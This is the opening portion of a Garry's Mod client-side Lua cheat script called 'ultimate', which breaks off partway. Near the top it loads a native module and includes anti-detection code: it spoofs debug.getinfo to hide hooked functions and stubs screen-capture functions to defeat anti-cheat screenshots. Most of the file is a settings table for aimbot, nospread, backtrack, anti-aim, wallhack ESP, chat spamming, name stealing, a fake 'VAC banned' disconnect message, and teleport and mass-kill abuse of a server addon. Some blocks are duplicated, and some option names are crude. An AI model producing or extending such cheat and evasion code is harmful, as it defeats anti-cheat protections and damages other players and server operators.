require("jopamodule")
jopa.Write = nil
jopa.Read = nil

local ultimate                          = {}
local me                                = LocalPlayer()


local MetaPlayer                        = FindMetaTable("Player")

local global 		                    = _G //table.Copy( _G ) 

local gRunCmd                           = global.RunConsoleCommand

local Angle                             = Angle 
local Material                          = Material 
local Vector                            = Vector 
local Color                             = Color
local pairs                             = pairs
local ipairs                            = ipairs 
local IsValid                           = IsValid
local tostring                          = tostring 
local tonumber                          = tonumber
local CurTime                           = CurTime
local IsFirstTimePredicted              = IsFirstTimePredicted
local Lerp                              = Lerp 
local LerpAngle                         = LerpAngle

local gFindMeta                         = global.FindMetaTable

local MetaPlayer                        = gFindMeta("Player")

local gVgui                             = global.vgui 
local gGui                              = global.gui
local gString                           = global.string
local gTable                            = global.table
local gUtil                             = global.util
local gHttp                             = global.http
local gFile                             = global.file
local gSurface                          = global.surface
local gDraw                             = global.draw
local gRender                           = global.render
local gCam                              = global.cam
local gInput                            = global.input
local gHook                             = global.hook
local gNet                              = global.net
local gMath                             = global.math
local gBit                              = global.bit
local gEnts                             = global.ents
local gPlys                             = global.player
local gGame                             = global.game
local gEngine                           = global.engine
local gTeam                             = global.team

local gPlayer                            = global.Player
local gEntity                            = global.Entity

local team_GetColor                     = gTeam.GetColor 
local team_GetName                      = gTeam.GetName

local surface_DrawLine                  = gSurface.DrawLine
local surface_DrawOutlinedRect          = gSurface.DrawOutlinedRect
local surface_DrawPoly                  = gSurface.DrawPoly
local surface_DrawRect                  = gSurface.DrawRect
local surface_DrawText                  = gSurface.DrawText
local surface_DrawTexturedRect          = gSurface.DrawTexturedRect
local surface_DrawTexturedRectRotated   = gSurface.DrawTexturedRectRotated
local surface_GetTextSize               = gSurface.GetTextSize
local surface_PlaySound                 = gSurface.PlaySound
local surface_SetAlphaMultiplier        = gSurface.SetAlphaMultiplier
local surface_SetDrawColor              = gSurface.SetDrawColor
local surface_SetFont                   = gSurface.SetFont
local surface_SetMaterial               = gSurface.SetMaterial
local surface_SetTextColor              = gSurface.SetTextColor
local surface_SetTextPos                = gSurface.SetTextPos
local surface_CreateFont                = gSurface.CreateFont
local surface_DrawCircle                = gSurface.DrawCircle

local math_abs                          = gMath.abs
local math_Round                        = gMath.Round
local math_floor                        = gMath.floor
local math_ceil                         = gMath.ceil
local math_min                          = gMath.min
local math_max                          = gMath.max
local math_Clamp                        = gMath.Clamp
local math_sin                          = gMath.sin
local math_cos                          = gMath.cos
local math_tan                          = gMath.tan
local math_rad                          = gMath.rad
local math_Rand                         = gMath.Rand
local math_randomseed                   = gMath.randomseed
local math_deg                          = gMath.deg
local math_atan                         = gMath.atan
local math_atan2                        = gMath.atan2
local math_asin                         = gMath.asin
local math_random                       = gMath.random
local math_huge                         = gMath.huge
local math_sqrt                         = gMath.sqrt

local math_Approach                     = gMath.Approach
local math_NormalizeAngle               = gMath.NormalizeAngle
local math_DistanceSqr                  = gMath.DistanceSqr

local hook_Add                          = gHook.Add
local hook_Remove                       = gHook.Remove
local hook_GetTable                     = gHook.GetTable
local hook_Call                         = gHook.Call
local hook_Run                          = gHook.Run

local bor                               = gBit.bor

local vgui_Create                       = gVgui.Create
local vgui_Register                     = gVgui.Register

local table_Count                       = gTable.Count
local table_Empty                      = gTable.Empty
local table_concat                      = gTable.concat
local table_insert                      = gTable.insert
local table_remove                      = gTable.remove
local table_RemoveByValue               = gTable.RemoveByValue
local table_sort                        = gTable.sort

function table.Empty( tbl ) 
    if tbl == _G then return end

    return table_Empty( tbl )
end 

local gui_ActivateGameUI                = gGui.ActivateGameUI
local gui_HideGameUI                    = gGui.HideGameUI
local gui_OpenURL                       = gGui.OpenURL

local string_find                       = gString.find
local string_format                     = gString.format
local string_len                        = gString.len
local string_sub                        = gString.sub
local string_lower                      = gString.lower
local StartsWith                        = gString.StartWith
local string_ToColor                    = gString.ToColor
local HSVToColor                        = global.HSVToColor

local TraceHull                         = util.TraceHull
local TraceLine                         = util.TraceLine

local file_Exists                       = gFile.Exists
local file_Delete                       = gFile.Delete
local file_Find                         = gFile.Find
local file_Read                         = gFile.Read
local file_Write                        = gFile.Write

local cam_Start3D                       = gCam.Start3D
local cam_End3D                         = gCam.End3D
local cam_Start3D2D                     = gCam.Start3D2D
local cam_End3D2D                       = gCam.End3D2D
local cam_Start2D                       = gCam.Start2D
local cam_End2D                         = gCam.End2D
local cam_IgnoreZ                       = gCam.IgnoreZ

local input_IsKeyDown                   = gInput.IsKeyDown
local input_IsMouseDown                 = gInput.IsMouseDown
local input_GetCursorPos                = gInput.GetCursorPos

local TickInterval                      = gEngine.TickInterval()
local ActiveGamemode                    = gEngine.ActiveGamemode()

local render_MaterialOverride           = gRender.MaterialOverride
local render_SetColorModulation         = gRender.SetColorModulation
local render_SetBlend                   = gRender.SetBlend
local render_SuppressEngineLighting     = gRender.SuppressEngineLighting
local render_DrawBeam                   = gRender.DrawBeam
local render_SetMaterial                = gRender.SetMaterial
local render_DrawWireframeBox           = gRender.DrawWireframeBox
local render_RenderView                 = gRender.RenderView
local render_Clear                      = gRender.Clear
local render_Capture                    = gRender.Capture
local render_CapturePixels              = gRender.CapturePixels
render.CapturePixels                    = function() return end
render.ReadPixel                        = function( x, y ) return 255, 255, 255, nil end

local player_GetAll                     = gPlys.GetAll
local ents_GetAll                       = gEnts.GetAll

local gDebugGetInfo                     = global.debug.getinfo

local scrw                              = ScrW()
local scrh                              = ScrH()
local scrwc                             = scrw / 2
local scrhc                             = scrh / 2


if debug and debug.getinfo then
    function debug.getinfo( func_or_stack, fields )
        local data = gDebugGetInfo( func_or_stack, fields )

        if(func_or_stack == _G.RunConsoleCommand || func_or_stack == _G.debug.getinfo) then
            data.source = "=[C]"
            data.what = "C"
        end

        return data
    end
end


surface.CreateFont( "veranda", { font = "Verdana", size = 12, antialias = false, outline = true } )
surface.CreateFont( "veranda_s", { font = "Verdana", size = 12, antialias = false, shadow = true } )
surface.CreateFont( "veranda_scr", { font = "Verdana", size = ScreenScale( 9 ), antialias = false, outline = true } )

surface.CreateFont( "saddamhussein", { font = "Open Sans", size = 64, weight = 1000 } )

ultimate.Colors = {}

for i = 0,255 do
    ultimate.Colors[i] = Color( i, i, i )
end

ultimate.Colors["Red"] = Color( 255, 0, 0, 255 )

ultimate.accent = Color( 255, 255, 255 )











local settings = {

}

local theme = {
    ["Frame background"] = Color( 25, 25, 25 ),
    ["Frame foreground"] = Color( 55, 55, 55 ),
    ["Frame title"] = Color( 165, 165, 165 ),
}

local pLocalPlayer = LocalPlayer()

local screenWidth = ScrW()
local screenHeight = ScrH()

local traceResult = {}
local traceStruct = { output = traceResult }

local flTickInterval = engine.TickInterval()

surface.CreateFont( "DermaSmall", {
	font = "Open Sans",
	size = 15,
} )









ultimate.Colors = {}

for i = 0,255 do
    ultimate.Colors[i] = Color( i, i, i )
end

ultimate.Colors["Red"] = Color( 255, 0, 0, 255 )

ultimate.accent = Color( 255, 255, 255 )











local settings = {

}

local theme = {
    ["Frame background"] = Color( 25, 25, 25 ),
    ["Frame foreground"] = Color( 55, 55, 55 ),
    ["Frame title"] = Color( 165, 165, 165 ),
}

local pLocalPlayer = LocalPlayer()

local screenWidth = ScrW()
local screenHeight = ScrH()

local traceResult = {}
local traceStruct = { output = traceResult }

local flTickInterval = engine.TickInterval()

surface.CreateFont( "DermaSmall", {
	font = "Open Sans",
	size = 15,
} )











ultimate.cached = {}

ultimate.Materials = {}

ultimate.Materials["Gradient"] = Material("gui/gradient_up", "noclamp smooth")
ultimate.Materials["Gradient down"] = Material("gui/gradient_down", "noclamp smooth")
ultimate.Materials["Gradient right"] = Material("gui/gradient", "noclamp smooth")
ultimate.Materials["Alpha grid"] = Material("gui/alpha_grid.png", "noclamp smooth")
ultimate.blur = Material("pp/blurscreen")


ultimate.presets = {}
ultimate.cfg = { vars = {}, binds = {}, colors = {} }

function ultimate.GetAnimatedColor( cfg, speed )
    local base = string_ToColor( ultimate.cfg.colors[ cfg ] ) or Color( 255, 255, 255, 255 )

    local r = base.r / 255
    local g = base.g / 255
    local b = base.b / 255
    local maxc = math_max( r, g, b )
    local minc = math_min( r, g, b )
    local delta = maxc - minc

    local h = 0
    local s = maxc == 0 and 0 or delta / maxc
    local v = maxc

    if delta ~= 0 then
        if maxc == r then
            h = ( ( g - b ) / delta ) % 6
        elseif maxc == g then
            h = ( ( b - r ) / delta ) + 2
        else
            h = ( ( r - g ) / delta ) + 4
        end

        h = h * 60
    end

    local animated = HSVToColor( ( h + CurTime() * ( speed or 120 ) ) % 360, s, v )
    animated.a = base.a

    return animated
end

ultimate.cfg.vars["Enable aimbot"]              = false
ultimate.cfg.binds["Aim on key"]                = 0

ultimate.cfg.vars["Silent aim"]                 = true
ultimate.cfg.vars["pSilent"]                    = false

ultimate.cfg.vars["Auto reload"]                = false
ultimate.cfg.vars["Auto fire"]                  = false
ultimate.cfg.vars["Rapid fire"]                 = false
ultimate.cfg.vars["Alt Rapid fire"]             = false
ultimate.cfg.vars["Bullet time"]                = false
ultimate.cfg.vars["Time"]                       = 0

ultimate.cfg.vars["Nospread"]                   = false
ultimate.cfg.vars["Force seed"]                 = false
ultimate.cfg.vars["Wait for seed"]              = false
ultimate.cfg.vars["Norecoil"]                   = false
ultimate.cfg.vars["HvHNoSpread"]           = false
ultimate.cfg.vars["dedulation"]                 = 1




ultimate.cfg.vars["Disable visual recoil"] = false

ultimate.cfg.vars["Extrapolation"]              = false
ultimate.cfg.vars["Show extrapolation line"]    = false
ultimate.cfg.vars["last update"]                = false
ultimate.cfg.vars["Disable Taunts"]         = false
ultimate.cfg.vars["Invalidate activity"]         = false
ultimate.cfg.vars["Bone fix"]                   = false
ultimate.cfg.vars["Update Client Anim fix"]     = false
ultimate.cfg.vars["Wait for simulation"]    = false
ultimate.cfg.vars["Disable interpolation"]      = false
ultimate.cfg.vars["Disable Sequence interpolation"] = false

ultimate.cfg.vars["Target selection"]           = 2
ultimate.cfg.vars["Ignores-Friends"]            = false
ultimate.cfg.vars["Target-Priority-Only"]       = false
ultimate.cfg.vars["Ignores-Steam friends"]      = false
ultimate.cfg.vars["Ignores-Teammates"]          = false
ultimate.cfg.vars["Ignores-Admins"]             = false
ultimate.cfg.vars["Ignores-Bots"]               = false
ultimate.cfg.vars["Ignores-Frozen"]             = false
ultimate.cfg.vars["Ignores-Nodraw"]             = false
ultimate.cfg.vars["Ignores-Nocliping"]          = false
ultimate.cfg.vars["Ignores-God time"]           = false
ultimate.cfg.vars["Ignores-Head unhitable"]     = false
ultimate.cfg.vars["Ignores-Driver"]             = false
ultimate.cfg.vars["Awall"]                      = false

ultimate.cfg.vars["Max targets"]                = 0

ultimate.cfg.vars["Hitbox selection"]           = 1
ultimate.cfg.vars["Hitscan"]                    = false
ultimate.cfg.vars["Hitscan groups-Head"]        = false
ultimate.cfg.vars["Hitscan groups-Chest"]       = false
ultimate.cfg.vars["Hitscan groups-Stomach"]     = false
ultimate.cfg.vars["Hitscan groups-Arms"]        = false
ultimate.cfg.vars["Hitscan groups-Legs"]        = false
ultimate.cfg.vars["Hitscan groups-Generic"]     = false
ultimate.cfg.vars["Hitscan mode"]               = 1
ultimate.cfg.vars["Multipoint"]                 = false
ultimate.cfg.vars["Multipoint scale"]           = 0.8
ultimate.cfg.vars["Multipoint groups-Head"]     = false
ultimate.cfg.vars["Multipoint groups-Chest"]    = false
ultimate.cfg.vars["Multipoint groups-Stomach"]  = false
ultimate.cfg.vars["Multipoint groups-Arms"]     = false
ultimate.cfg.vars["Multipoint groups-Legs"]     = false
ultimate.cfg.vars["Multipoint groups-Generic"]  = false

ultimate.cfg.vars["Adjust tickcount"]           = false
ultimate.cfg.vars["Gun switch"]                 = false
ultimate.cfg.vars["Auto detonator"]             = false
ultimate.cfg.vars["AutoD distance"]             = 96

ultimate.cfg.vars["Backtrack"]                  = false
ultimate.cfg.vars["Always backtrack"]           = false
ultimate.cfg.vars["Backtrack mode"]             = 1
ultimate.cfg.vars["Sampling interval"]          = 0
ultimate.cfg.vars["Backtrack time"]             = 200

ultimate.cfg.vars["Aimbot smoothing"]           = false
ultimate.cfg.vars["Smoothing"]                  = 0.05

ultimate.cfg.vars["Fov limit"]                  = false
ultimate.cfg.vars["Aimbot FOV"]                 = 30
ultimate.cfg.vars["Show FOV"]                   = false
ultimate.cfg.colors["Show FOV"]                 = "255 255 0 255"

ultimate.cfg.vars["Aimbot snapline"]                   = false
ultimate.cfg.colors["Aimbot snapline"]                 = "255 128 0 255"
ultimate.cfg.vars["Aimbot marker"]                   = false
ultimate.cfg.vars["Aimbot marker type"]              = 1
ultimate.cfg.colors["Aimbot marker"]                 = "255 255 255 255"
ultimate.cfg.colors["GTA Marker"]                   = "0 128 0 255"
ultimate.cfg.vars["GTA Marker Radius"]               = 30
ultimate.cfg.vars["GTA Marker Size"]                 = 10
ultimate.cfg.vars["GTA Marker Speed"]                = 100


ultimate.cfg.vars["Prop aimbot"]                = false
ultimate.cfg.vars["PA thrower"]                 = false
ultimate.cfg.vars["PA thrower dist"]            = 128
ultimate.cfg.vars["Prop max simtime"]           = 4

ultimate.cfg.vars["Crossbow prediction"]        = false
ultimate.cfg.vars["Smg grenade prediction"]     = false

--ultimate.cfg.vars["Simulation limit"]           = 4

ultimate.cfg.vars["Baim low health"]            = false
ultimate.cfg.vars["Baim health"]                = 65

ultimate.cfg.vars["Auto healthkit"]             = false
ultimate.cfg.vars["Healthkit-Self heal"]        = false
ultimate.cfg.vars["Healthkit-Heal closest"]     = false

ultimate.cfg.vars["Knifebot"]                   = false
ultimate.cfg.vars["Knifebot mode"]              = 1
ultimate.presets["Knifebot mode"] = { "Damage", "Fast", "Fatal" }

ultimate.cfg.vars["Facestab"]                   = false

ultimate.cfg.vars["Projectile aimbot"]          = false

ultimate.cfg.vars["Forwardtrack"]               = false
ultimate.cfg.vars["Forwardtrack time"]          = 100








// Resolver

ultimate.cfg.vars["Resolver"] = false
ultimate.cfg.vars["Brute Yaw Value"]            = -180
ultimate.cfg.vars["Yaw mode"] = 1
ultimate.cfg.vars["Pitch resolver"] = false
ultimate.cfg.vars["Taunt resolver"] = false



ultimate.cfg.vars["Invert first shot"] = false
ultimate.cfg.vars["Resolver max misses"] = 2


// Tickbase
ultimate.cfg.vars["Tickbase shift"] = false
ultimate.cfg.vars["Wait for unlag"] = false

ultimate.cfg.vars["Fakelag comp"] = 2

ultimate.cfg.vars["Skip fire tick"] = false
ultimate.cfg.vars["Double tap"] = false
ultimate.cfg.vars["Dodge projectiles"] = false
ultimate.cfg.vars["Passive recharge"] = false

ultimate.cfg.vars["Auto recharge"] = false
ultimate.cfg.vars["Wait for charge"] = false
ultimate.cfg.vars["Warp on peek"] = false

ultimate.cfg.vars["Charge ticks"] = 48
ultimate.cfg.vars["Shift ticks"] = 48
ultimate.cfg.binds["Tickbase shift"] = 0
ultimate.cfg.binds["Auto recharge"] = 0



ultimate.cfg.vars["Anti aim"]                   = false
ultimate.cfg.vars["Yaw randomisation"]          = false

ultimate.cfg.vars["Custom real"]                = 75
ultimate.cfg.vars["Custom fake"]                = 180
ultimate.cfg.vars["Custom pitch"]               = 89
ultimate.cfg.vars["Spin speed"]                 = 30
ultimate.cfg.vars["Sin delta"]                  = 89
ultimate.cfg.vars["Sin add"]                    = 11
ultimate.cfg.vars["Jitter delta"]               = 45



ultimate.cfg.vars["Yaw base"]                   = 1
ultimate.presets["Yaw base"] = { "Viewangles", "At targets" }
ultimate.cfg.vars["Yaw"]                        = 1
ultimate.presets["Yaw"] = {
    "Backward", "Fake Forward", "Legit Delta",
    "Sideways", "Half Sideways",
    "Fake Spin", "Sin Sway", "Pendulum Sway", "Lag Sway",
    "Fake Jitter", "Kappa Jitter", "Abu Jitter",
    "Satanic Spin", "Custom"
}
ultimate.cfg.vars["Pitch"]                      = 1
ultimate.presets["Pitch"] = {
    "Down", "Up", "Zero",
    "Fake down", "Fake fake down",
    "Fake jitter", "Kizaru",
    "Custom"
}
ultimate.cfg.vars["Edge"]                       = 1

ultimate.cfg.binds["Anti aim"]                   = 0







ultimate.cfg.vars["Antiaim material"] = 1
ultimate.cfg.vars["Antiaim fullbright"] = false
ultimate.cfg.colors["Real chams"] = "128 128 255 255"

// Anim breakers

ultimate.cfg.vars["Taunt spam"] = false
ultimate.cfg.vars["Taunt"] = 1
ultimate.cfg.vars["Taunt spam 2"] = false
ultimate.cfg.vars["Taunt 2"] = 1

ultimate.cfg.vars["Handjob"] = false
ultimate.cfg.vars["Handjob mode"] = 1


ultimate.cfg.vars["Micromovement"] = false
ultimate.cfg.vars["On shot aa"] = false
ultimate.cfg.vars["Freestanding"] = false
ultimate.cfg.binds["freestand"] = 0
ultimate.cfg.vars["Inverter"] = false
ultimate.cfg.binds["Inverter"] = 0
ultimate.cfg.vars["Anti aim chams"] = false
ultimate.cfg.vars["Hitbox"] = false
ultimate.cfg.colors["Hitbox"] = "255 255 255"

ultimate.cfg.vars["Indicators"] = false






ultimate.cfg.vars["Free standing"] = false
ultimate.cfg.vars["Dancer"] = false
    ultimate.cfg.vars["Dance"] = 1
    ultimate.cfg.vars["Arm breaker"] = false
    ultimate.cfg.vars["Arm breaker mode"] = 1
    ultimate.cfg.vars["Fake duck"] = false
    ultimate.cfg.vars["Fake duck mode"] = 1
    ultimate.cfg.vars["Fake walk"] = false
    ultimate.cfg.vars["Crimwalk"] = false

    ultimate.cfg.vars["Air crouch"] = false
    ultimate.cfg.vars["Air crouch mode"] = 1

// fake lag
ultimate.cfg.vars["Fake lag"] = false

ultimate.cfg.vars["Fake lag options-Disable on ladder"] = false
ultimate.cfg.vars["Fake lag options-Disable in attack"] = false
ultimate.cfg.vars["Fake lag options-On peek"] = false
ultimate.cfg.vars["Fake lag options-Randomise"] = false

ultimate.cfg.vars["Lag mode"] = 1

ultimate.cfg.vars["Lag limit"] = 1
ultimate.cfg.vars["Lag randomisation"] = 1

ultimate.cfg.vars["Fake duck"] = false
ultimate.cfg.binds["Fake duck"] = 0

ultimate.cfg.vars["Air lag duck"] = false
ultimate.cfg.vars["Jesus lag"] = false



ultimate.cfg.vars["Allah fly"] = false


// Sequence manip
ultimate.cfg.vars["Sequence manip"] = false
ultimate.cfg.vars["Sequence mode"] = 1
ultimate.cfg.vars["Sequence resolver"] = false
ultimate.cfg.vars["OutSequence"] = 500
ultimate.cfg.binds["Sequence manip"] = 0
ultimate.cfg.vars["Sequence min random"] = false
ultimate.cfg.vars["Sequence min"] = 1

ultimate.cfg.binds["Animation freezer"] = 0
ultimate.cfg.vars["Animation freezer"] = false

ultimate.cfg.vars["Freeze on peek"] = false

ultimate.cfg.vars["Allah walk"] = false
ultimate.cfg.binds["allahwalk"] = 0

// Animfix

ultimate.cfg.vars["Interpolation-Disable interpolation"] = false
ultimate.cfg.vars["Interpolation-Fast sequences"] = false





    // ESP
    ultimate.cfg.vars["Bounding box"] = false



// Movement
ultimate.cfg.vars["Bhop"] = false
ultimate.cfg.vars["Sprint"] = false
ultimate.cfg.vars["Safe hop"] = false
ultimate.cfg.vars["Edge jump"] = false
ultimate.cfg.vars["Air duck"] = false

ultimate.cfg.vars["Air strafer"] = false
ultimate.cfg.vars["Strafe mode"] = 1
ultimate.cfg.vars["Ground strafer"] = false
ultimate.cfg.vars["Fast stop"] = false
ultimate.cfg.vars["Z Hop"] = false
ultimate.cfg.binds["Z Hop"] = 0

ultimate.cfg.vars["Water jump"] = false
ultimate.cfg.vars["Remove keys"] = false

ultimate.cfg.vars["Auto peak"] = false
ultimate.cfg.binds["Auto peak"] = 0
ultimate.cfg.vars["Auto peak tp"] = false

ultimate.cfg.vars["Circle strafe"] = false
ultimate.cfg.binds["Circle strafe"] = 0
ultimate.cfg.vars["CStrafe ticks"] = 64
ultimate.cfg.vars["CStrafe angle step"] = 1
ultimate.cfg.vars["CStrafe angle max step"] = 10
ultimate.cfg.vars["CStrafe ground diff"] = 10

ultimate.cfg.vars["Adaptive CStrafe"] = false
ultimate.cfg.binds["Adaptive CStrafe"] = 0
ultimate.cfg.vars["Adaptive CStrafe Path"] = false
ultimate.cfg.colors["Adaptive CStrafe Path"] = "255 255 255 255"

ultimate.cfg.vars["Cvar name"] = ""
ultimate.cfg.vars["Cvar int"] = "1"
ultimate.cfg.vars["Cvar str"] = ""
ultimate.cfg.vars["Cvar mode"] = 1
ultimate.cfg.vars["Cvar flag"] = 1

ultimate.cfg.vars["Net Convar"] = ""
ultimate.cfg.vars["Net Convar str"] = ""
ultimate.cfg.vars["Net Convar int"] = 1
ultimate.cfg.vars["Net Convar mode"] = 1

ultimate.cfg.vars["Name Convar"] = ""
ultimate.cfg.vars["Disconnect reason"] = "VAC banned from secure server"
ultimate.cfg.vars["Name stealer"] = false
ultimate.cfg.vars["Auto reconnect"] = false

ultimate.cfg.vars["Chat spammer"]       = false
ultimate.cfg.vars["Chat mode"]          = 1
ultimate.cfg.vars["Chat group"]         = 1
ultimate.cfg.vars["Chat delay"]         = 1

ultimate.cfg.vars["Killsay"]            = false
ultimate.cfg.vars["Killsay mode"]          = 1
ultimate.cfg.vars["Killsay group"]         = 1

ultimate.cfg.vars["Retry on handcuff"] = false

// FTPToPos abuse xd )))
ultimate.cfg.vars["FSpec Teleport"] = false
ultimate.cfg.binds["FSpec Teleport"] = 0

ultimate.cfg.vars["FSpec Masskill"] = false
ultimate.cfg.binds["FSpec Masskill"] = 0

ultimate.cfg.vars["FSpec ClickTP"] = false
ultimate.cfg.binds["FSpec ClickTP"] = 0

ultimate.cfg.vars["FSpec Velocity"] = false
ultimate.cfg.binds["FSpec Velocity"] = 0

// Player visuals
ultimate.cfg.vars["Box esp"]                    = false
ultimate.cfg.vars["Box style"]                  = 1

ultimate.cfg.vars["Sight lines"]        = false

ultimate.cfg.vars["ESP Font"]                  = 1

ultimate.cfg.vars["Box gradient"]   = false

ultimate.cfg.colors["Box esp"]      = "128 128 255 255"
ultimate.cfg.colors["Box gradient"] = "0 255 255 255"

ultimate.cfg.vars["Box team color"] = false

ultimate.cfg.vars["Name"] = false
ultimate.cfg.vars["Name pos"] = 1


ultimate.cfg.vars["Usergroup"] = false
ultimate.cfg.vars["Usergroup pos"] = 1

ultimate.cfg.vars["Team"] = false
ultimate.cfg.vars["Team pos"] = 1

ultimate.cfg.vars["Health"] = false
ultimate.cfg.vars["Health bar"] = false
ultimate.cfg.vars["Health bar gradient"] = false
ultimate.cfg.vars["Health pos"] = 4
ultimate.cfg.colors["Health"] = "75 255 0 255"
ultimate.cfg.colors["Health bar gradient"] = "255 45 0 255"


ultimate.cfg.vars["Armor"] = false
ultimate.cfg.vars["Armor bar"] = false
ultimate.cfg.vars["Armor bar gradient"] = false
ultimate.cfg.vars["Armor pos"] = 4
ultimate.cfg.colors["Armor"] = "72 72 255 255"
ultimate.cfg.colors["Armor bar gradient"] = "72 255 72 255"

ultimate.cfg.vars["DarkRP Money"] = false
ultimate.cfg.vars["Money pos"] = 1

ultimate.cfg.vars["Weapon"] = false
ultimate.cfg.vars["Weapon pos"] = 1

ultimate.cfg.vars["Show ammo"] = false
ultimate.cfg.vars["Weapon printname"] = false
ultimate.cfg.vars["Show reload"] = false

ultimate.cfg.vars["Break LC"] = false
ultimate.cfg.vars["Break LC pos"] = 1

ultimate.cfg.vars["Simtime updated"] = false
ultimate.cfg.vars["Simtime pos"] = 1

ultimate.cfg.colors["Skeleton"] = "255 255 255 255"
ultimate.cfg.vars["Skeleton"] = false

ultimate.cfg.vars["Player flags"] = false


// Chams
ultimate.cfg.vars["Visible chams"] = false
ultimate.cfg.vars["Visible chams w"] = false
ultimate.cfg.vars["Visible mat"] = 1
ultimate.cfg.colors["Visible chams"] = "0 255 255 255"

ultimate.cfg.vars["inVisible chams"] = false
ultimate.cfg.vars["inVisible chams w"] = false
ultimate.cfg.vars["inVisible mat"] = 1
ultimate.cfg.colors["inVisible chams"] = "255 255 0 255"

ultimate.cfg.vars["Supress lighting"] = false

ultimate.cfg.vars["Self chams"] = false
ultimate.cfg.vars["Self chams w"] = false
ultimate.cfg.vars["Self mat"] = 1
ultimate.cfg.colors["Self chams"] = "255 0 255 255"

ultimate.cfg.vars["Supress self lighting"] = false

ultimate.cfg.vars["Show records"] = false

ultimate.cfg.vars["Backtrack chams"] = false
ultimate.cfg.vars["Backtrack material"] = 1
ultimate.cfg.vars["Backtrack fullbright"] = false
ultimate.cfg.colors["Backtrack chams"] = "255 128 255 255"
ultimate.cfg.vars["Backtrack skeleton"] = false
ultimate.cfg.vars["OOF Arrows"] = false
ultimate.cfg.vars["OOF Style"] = 1



ultimate.cfg.vars["On screen logs"] = false

ultimate.cfg.colors["On screen logs"] = "69 255 69 255"
ultimate.cfg.colors["Miss lagcomp"] = "69 69 255 255"
ultimate.cfg.colors["Miss spread"] = "255 255 69 255"
ultimate.cfg.colors["Miss fail"] = "255 69 69 255"

ultimate.cfg.vars["Entity chams"] = false
ultimate.cfg.vars["Entity material"] = 1
ultimate.cfg.vars["Entity fullbright"] = false
ultimate.cfg.colors["Entity chams"] = "255 89 89 255"

ultimate.cfg.vars["Player outline"] = false
ultimate.cfg.vars["Entity outline"] = false
ultimate.cfg.colors["Player outline"] = "45 255 86 255"
ultimate.cfg.colors["Entity outline"] = "255 86 45 255"

ultimate.cfg.vars["Outline style"] = 1

ultimate.cfg.vars["ESP Distance"] = 3500

ultimate.cfg.binds["Player add"] = 0
ultimate.cfg.binds["Priority add"] = 0

// Entity Esp
ultimate.cfg.binds["Ent add"] = 0
ultimate.cfg.vars["Ent box"] = false
ultimate.cfg.vars["Ent box style"] = 1
ultimate.cfg.vars["Ent class"] = false
ultimate.cfg.vars["Ent ESP Distance"] = 3500

ultimate.cfg.vars["Fresnel minimum illum"] = 0
ultimate.cfg.vars["Fresnel maximum illum"] = 1
ultimate.cfg.vars["Fresnel exponent"] = 1

// Hitmarker
ultimate.cfg.vars["Hitmarker"] = false
ultimate.cfg.vars["Hit particles"] = false
ultimate.cfg.vars["Hitnumbers"] = false

ultimate.cfg.vars["Hitsound"] = false
ultimate.cfg.vars["Killsound"] = false

ultimate.cfg.vars["Hitsound str"] = "phx/hmetal1.wav"
ultimate.cfg.vars["Killsound str"] = "ambient/levels/canals/windchime2.wav"

ultimate.cfg.colors["Hit particles"] = "255 128 235 255"
ultimate.cfg.colors["Hitmarker"] = "255 155 25 255"
ultimate.cfg.colors["Hitnumbers"] = "255 255 255 255"
ultimate.cfg.colors["Hitnumbers krit"] = "255 35 35 255"

// Name hide / visual misc

ultimate.cfg.vars["Hide name"] = false
ultimate.cfg.vars["Custom name"] = "Your mom"
ultimate.cfg.vars["Disable sensivity adjustment"] = false
ultimate.cfg.vars["Screengrab image"] = false
ultimate.cfg.vars["Crosshair"] = false
ultimate.cfg.colors["Crosshair color"] = "255 255 255 255" 


// Visuals
ultimate.cfg.vars["Tickbase indicator"] = false
ultimate.cfg.vars["Spectator list"] = false
ultimate.cfg.colors["Spectator list header"] = "35 35 35 255"
ultimate.cfg.colors["Spectator list accent"] = "128 128 128 255"
ultimate.cfg.colors["Spectator list title"] = "128 128 128 255"
ultimate.cfg.colors["Spectator list text"] = "255 255 255 255"
ultimate.cfg.colors["Spectator list target"] = "255 0 0 255"


ultimate.cfg.vars["Killsound"] = false

// World
ultimate.cfg.vars["Custom sky"] = GetConVar("sv_skyname"):GetString()
ultimate.cfg.vars["Sky color"] = false
ultimate.cfg.colors["Sky color"] = "145 185 245 255"
ultimate.cfg.vars["Wall color"] = false
ultimate.cfg.colors["Wall color"] = "50 45 65 255"
ultimate.cfg.vars["Fullbright"] = false
ultimate.cfg.vars["Fullbright mode"] = 1
ultimate.cfg.binds["Fullbright"] = 0
ultimate.cfg.vars["Disable shadows"] = false
ultimate.cfg.vars["FogChanger"] = false
ultimate.cfg.colors["FogChanger"] = "255 255 255 255"
ultimate.cfg.vars["FogStart"] = 1500
ultimate.cfg.vars["FogEnd"] = 3000
ultimate.cfg.vars["Color Modify"] = false
ultimate.cfg.vars["Color Modify Brightness"] = 0
ultimate.cfg.vars["Color Modify Contrast"] = 1
ultimate.cfg.vars["Color Modify Saturation"] = 3
ultimate.cfg.vars["Color Modify Add Red"] = 0
ultimate.cfg.vars["Color Modify Add Green"] = 0
ultimate.cfg.vars["Color Modify Add Blue"] = 0
ultimate.cfg.vars["Color Modify Mul Red"] = 0
ultimate.cfg.vars["Color Modify Mul Green"] = 0
ultimate.cfg.vars["Color Modify Mul Blue"] = 0

// Effects
ultimate.cfg.vars["Bullet tracers"] = false
ultimate.cfg.colors["Bullet tracers"] = "255 65 65 255"
ultimate.cfg.vars["Bullet tracers material"] = "effects/beam_generic01"
ultimate.cfg.vars["Tracers die time"] = 5
ultimate.cfg.vars["Bullet tracers muzzle"] = false

// View
ultimate.cfg.vars["Third person"] = false
ultimate.cfg.binds["Third person"] = 0
ultimate.cfg.vars["Third person collision"] = false
ultimate.cfg.vars["Third person smoothing"] = false
ultimate.cfg.vars["Third person distance"] = 150

ultimate.cfg.vars["Free camera"] = false
ultimate.cfg.binds["Free camera"] = 0
ultimate.cfg.vars["Free camera speed"] = 25
ultimate.cfg.vars["Ghetto free cam"] = false

ultimate.cfg.vars["Override view"] = true

ultimate.cfg.vars["Fov override"] = GetConVarNumber("fov_desired")

ultimate.cfg.vars["Aspect ratio"] = 0

ultimate.cfg.vars["Viewmodel changer"] = false

ultimate.cfg.vars["Viewmodel Manip"] = false

ultimate.cfg.vars["Viewmodel fov"] = GetConVar("viewmodel_fov"):GetInt()

ultimate.cfg.vars["Viewmodel chams"] = false
ultimate.cfg.colors["Viewmodel chams"] = "75 95 128 255"
ultimate.cfg.vars["Viewmodel chams type"] = 1
ultimate.cfg.vars["Fullbright viewmodel"] = false


ultimate.cfg.vars["Viewmodel x"] = 0
